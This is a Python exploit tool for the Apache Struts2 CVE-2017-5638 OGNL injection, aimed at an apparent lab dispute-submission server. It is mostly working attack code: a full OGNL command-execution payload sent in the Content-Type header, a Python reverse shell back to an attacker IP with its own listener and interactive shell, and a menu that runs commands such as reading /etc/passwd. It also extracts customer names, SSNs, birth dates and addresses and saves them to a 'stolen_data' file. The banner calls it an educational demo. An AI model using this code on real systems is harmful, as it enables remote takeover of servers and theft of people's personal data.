#!/usr/bin/env python3
import requests
import sys
import time
import socket
import subprocess
from colorama import init, Fore, Style

# Initialize colorama for Windows
init()

REVERSE_SHELL_PAYLOAD = """
bash -i >& /dev/tcp/{ip}/{port} 0>&1
"""

TARGET_IP = "192.168.1.6"  # Windows IP where server is running
TARGET_PORT = 5000
ATTACKER_IP = "192.168.1.100"  # Replace this with your Linux/Kali IP
ATTACKER_PORT = 4444

def print_banner():
    banner = f"""
{Fore.RED}██╗  ██╗ █████╗ ██╗     ██╗    ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║ ██╔╝██╔══██╗██║     ██║    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
█████╔╝ ███████║██║     ██║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██╔═██╗ ██╔══██║██║     ██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
██║  ██╗██║  ██║███████╗██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   {Style.RESET_ALL}
                                                                 
{Fore.YELLOW}[*] CVE-2017-5638 Apache Struts2 Exploit (Real Kali Version)
[*] Reverse Shell + Data Exfiltration
[*] Educational Demo - DO NOT USE ON REAL SYSTEMS{Style.RESET_ALL}
"""
    print(banner)

def create_reverse_shell_payload(ip, port):
    # This creates a reverse shell payload that would actually work on Linux
    cmd = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    
    return (
        "%{"
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='{cmd}')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    )

def setup_listener(port):
    """Sets up a netcat-style listener for reverse shell"""
    try:
        print(f"{Fore.YELLOW}[*] Setting up listener on port {port}...{Style.RESET_ALL}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(1)
        print(f"{Fore.GREEN}[+] Listening on port {port}{Style.RESET_ALL}")
        return s
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to setup listener: {str(e)}{Style.RESET_ALL}")
        return None

def create_linux_payload(cmd):
    # Real Linux command injection payload
    if cmd.startswith('reverse_shell'):
        _, ip, port = cmd.split()
        return create_reverse_shell_payload(ip, port)
    
    # For regular Linux commands
    return (
        "%{"
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        f"(#cmd='{cmd}')."
        "('/bin/bash','-c',#cmd)."
        "(#p=new java.lang.ProcessBuilder('/bin/bash','-c',#cmd))."
        "(#p.redirectErrorStream(true))."
        "(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}"
    )

def send_exploit(url, cmd):
    print(f"{Fore.YELLOW}[*] Targeting URL: {url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Executing command: {cmd}{Style.RESET_ALL}")
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Kali Linux; X11)',
        'Content-Type': create_linux_payload(cmd)
    }
    
    try:
        print(f"{Fore.BLUE}[*] Sending malicious request...{Style.RESET_ALL}")
        response = requests.post(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] Exploit succeeded!{Style.RESET_ALL}")
            if not cmd.startswith('reverse_shell'):
                print(f"\n{Fore.WHITE}Command Output:{Style.RESET_ALL}")
                print("-" * 60)
                print(response.text.strip())
                print("-" * 60)
            return True
        else:
            print(f"{Fore.RED}[-] Exploit failed. Status code: {response.status_code}{Style.RESET_ALL}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        return False

def extract_data(url):
    print(f"\n{Fore.YELLOW}[*] Attempting to extract customer data...{Style.RESET_ALL}")
    
    try:
        # First, let's try to get direct database access using Linux commands
        db_cmd = "cat /etc/passwd; find / -name '*.db' -type f 2>/dev/null"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Kali Linux; X11)',
            'Content-Type': create_linux_payload(db_cmd)
        }
        
        print(f"{Fore.BLUE}[*] Attempting to locate database files...{Style.RESET_ALL}")
        requests.post(f"{url}/api/submit-dispute", headers=headers)
        
        # Now get the customer data through the API
        response = requests.get(f"{url}/api/disputes")
        if response.status_code == 200:
            data = response.json()
            if 'disputes' in data:
                print(f"{Fore.GREEN}[+] Successfully extracted {len(data['disputes'])} records{Style.RESET_ALL}")
                print("\nCustomer Records:")
                print("-" * 100)
                print(f"{Fore.CYAN}{'ID':<5} {'Name':<20} {'SSN':<15} {'DOB':<12} {'Address':<30}{Style.RESET_ALL}")
                print("-" * 100)
                
                for dispute in data['disputes']:
                    print(
                        f"{dispute['id']:<5} "
                        f"{dispute['name']:<20} "
                        f"{dispute['ssn']:<15} "
                        f"{dispute['dob']:<12} "
                        f"{dispute['address']:<30}"
                    )
                print("-" * 100)
                
                # Try to save to file like real attackers would
                print(f"\n{Fore.YELLOW}[*] Saving data to disk...{Style.RESET_ALL}")
                with open('stolen_data.txt', 'w') as f:
                    for dispute in data['disputes']:
                        f.write(f"ID: {dispute['id']}, Name: {dispute['name']}, SSN: {dispute['ssn']}, DOB: {dispute['dob']}, Address: {dispute['address']}\n")
                print(f"{Fore.GREEN}[+] Data saved to stolen_data.txt{Style.RESET_ALL}")
                return True
        
        print(f"{Fore.RED}[-] Failed to extract data{Style.RESET_ALL}")
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[-] Error: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    print_banner()
    
    target_url = f"http://{TARGET_IP}:{TARGET_PORT}"
    
    while True:
        print(f"\n{Fore.CYAN}Kali Linux Attack Menu:{Style.RESET_ALL}")
        print("1. Execute Linux commands")
        print("2. Get reverse shell")
        print("3. Extract customer data")
        print("4. Exit")
        
        choice = input(f"\n{Fore.GREEN}kali@exploit# {Style.RESET_ALL}")
        
        if choice == "1":
            print("\nLinux Commands:")
            print("1. ls -la (List files)")
            print("2. cat /etc/passwd (Show users)")
            print("3. uname -a (System info)")
            print("4. ps aux (Running processes)")
            print("5. netstat -an (Network connections)")
            print("6. Custom Linux command")
            
            cmd_choice = input(f"\n{Fore.GREEN}kali@exploit# {Style.RESET_ALL}")
            
            cmd = {
                "1": "ls -la",
                "2": "cat /etc/passwd",
                "3": "uname -a",
                "4": "ps aux",
                "5": "netstat -an",
                "6": input(f"{Fore.YELLOW}Enter Linux command: {Style.RESET_ALL}")
            }.get(cmd_choice)
            
            if cmd:
                send_exploit(f"{target_url}/api/submit-dispute", cmd)
                
        elif choice == "2":
            print(f"\n{Fore.YELLOW}[*] Reverse Shell Setup{Style.RESET_ALL}")
            ip = ATTACKER_IP
            port = ATTACKER_PORT
            
            # Setup listener first
            listener = setup_listener(port)
            if listener:
                # Send reverse shell payload
                send_exploit(f"{target_url}/api/submit-dispute", f"reverse_shell {ip} {port}")
                
                print(f"{Fore.YELLOW}[*] Waiting for connection...{Style.RESET_ALL}")
                try:
                    conn, addr = listener.accept()
                    print(f"{Fore.GREEN}[+] Got reverse shell from {addr[0]}:{addr[1]}{Style.RESET_ALL}")
                    
                    while True:
                        cmd = input(f"{Fore.RED}shell@{addr[0]}# {Style.RESET_ALL}")
                        if cmd.lower() in ['exit', 'quit']:
                            break
                        conn.send(cmd.encode() + b'\n')
                        print(conn.recv(4096).decode())
                        
                except Exception as e:
                    print(f"{Fore.RED}[-] Shell error: {str(e)}{Style.RESET_ALL}")
                finally:
                    listener.close()
            
        elif choice == "3":
            extract_data(target_url)
            
        elif choice == "4":
            print(f"\n{Fore.YELLOW}[*] Exiting...{Style.RESET_ALL}")
            sys.exit(0)
            
        else:
            print(f"{Fore.RED}[-] Invalid choice{Style.RESET_ALL}")
        
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Exploit terminated by user{Style.RESET_ALL}")
        sys.exit(0)
